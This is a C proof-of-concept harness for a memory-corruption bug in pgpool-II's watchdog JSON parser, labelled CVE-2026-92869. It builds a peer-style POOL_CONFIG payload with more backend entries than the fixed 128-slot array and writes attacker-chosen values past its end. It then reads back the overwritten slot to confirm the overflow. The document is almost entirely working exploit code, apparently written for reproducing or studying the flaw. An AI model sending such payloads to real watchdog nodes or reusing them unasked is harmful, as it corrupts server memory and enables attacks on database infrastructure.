/*
 * Direct-call harness for the CVE-2026-92869 adjacent lane.
 * Calls the real upstream get_pool_config_from_json() from a pinned
 * src/watchdog/wd_json_data.c object with a peer-style POOL_CONFIG JSON.
 * The peer controls the backend_desc array length; 4.7.2 copies it into the
 * fixed 128-element BackendDesc.backend_info array without an upper bound.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include "pool.h"
#include "pool_config.h"
#include "watchdog/wd_json_data.h"
#include "parser/pg_list.h"

/* Unused by the config-parse path; stubs satisfy unrelated object references. */
void	   *MemoryContextAlloc(MemoryContext ctx, Size n) { (void) ctx; return malloc(n); }
void	   *copyObjectImpl(const void *from) { (void) from; return NULL; }
size_t		pvsnprintf(char *buf, size_t len, const char *fmt, va_list ap)
{ return (size_t) vsnprintf(buf, len, fmt, ap); }

/* Stub globals the real object references; not used by the config-parse path. */
POOL_CONFIG *pool_config = NULL;
POOL_REQUEST_INFO *Req_info = NULL;

/* All required scalar keys are emitted literally in payload(). */

static char *
payload(int backends, unsigned int chosen_port)
{
	size_t		cap = 4096 + (size_t) backends * 128;
	char	   *buf = malloc(cap);
	size_t		off = 0;
	int			i;

	if (!buf)
		exit(2);
	off += (size_t) snprintf(buf + off, cap - off,
		"{\"listen_backlog_multiplier\":0,\"child_life_time\":0,"
		"\"connection_life_time\":0,\"child_max_connections\":0,"
		"\"client_idle_limit\":0,\"max_pool\":0,\"num_init_children\":0,"
		"\"min_spare_children\":0,\"max_spare_children\":0,"
		"\"process_management_mode\":0,\"process_management_strategy\":0,"
		"\"replication_mode\":0,\"enable_pool_hba\":0,\"load_balance_mode\":0,"
		"\"replication_stop_on_mismatch\":0,\"allow_clear_text_frontend_auth\":0,"
		"\"failover_if_affected_tuples_mismatch\":0,\"replicate_select\":0,"
		"\"connection_cache\":0,\"health_check_timeout\":0,"
		"\"health_check_period\":0,\"health_check_max_retries\":0,"
		"\"health_check_retry_delay\":0,\"failover_on_backend_error\":0,"
		"\"recovery_timeout\":0,\"search_primary_node_timeout\":0,"
		"\"client_idle_limit_in_recovery\":0,\"insert_lock\":0,"
		"\"memory_cache_enabled\":0,\"use_watchdog\":0,"
		"\"clear_memqcache_on_escalation\":0,\"wd_priority\":0,"
		"\"pgpool_node_id\":0,\"failover_when_quorum_exists\":0,"
		"\"failover_require_consensus\":0,"
		"\"allow_multiple_failover_requests_from_node\":0,"
		"\"backend_desc\":[");
	for (i = 0; i < backends; i++)
	{
		unsigned int port = (i >= MAX_NUM_BACKENDS) ? chosen_port : 5432U;

		off += (size_t) snprintf(buf + off, cap - off,
			"%s{\"backend_port\":%u,\"backend_hostname\":\"h\"}",
			i ? "," : "", port);
	}
	off += (size_t) snprintf(buf + off, cap - off,
		"],\"wd_nodes\":[{\"wd_port\":9000,\"pgpool_port\":9999,\"hostname\":\"node0\"}]}");
	return buf;
}

int main(int argc, char **argv)
{
	int			n = (argc > 1) ? atoi(argv[1]) : 129;
	unsigned int chosen = (argc > 2) ? strtoul(argv[2], NULL, 0) : 0x42424242U;
	char	   *json = payload(n, chosen);
	POOL_CONFIG *cfg;

	fprintf(stderr, "payload_len=%zu backends=%d chosen=0x%08x\n",
		strlen(json), n, chosen);
	cfg = get_pool_config_from_json(json, (int) strlen(json));
	fprintf(stderr, "returned=%p", (void *) cfg);
	if (cfg && cfg->backend_desc)
	{
		fprintf(stderr, " num_backends=%d", cfg->backend_desc->num_backends);
		if (n > MAX_NUM_BACKENDS)
		{
			volatile int *past = (volatile int *)
				((char *) cfg->backend_desc->backend_info +
				 sizeof(cfg->backend_desc->backend_info));
			fprintf(stderr, " slot128=0x%08x", (unsigned int) *past);
		}
	}
	fprintf(stderr, "\n");
	free(json);
	return 0;
}
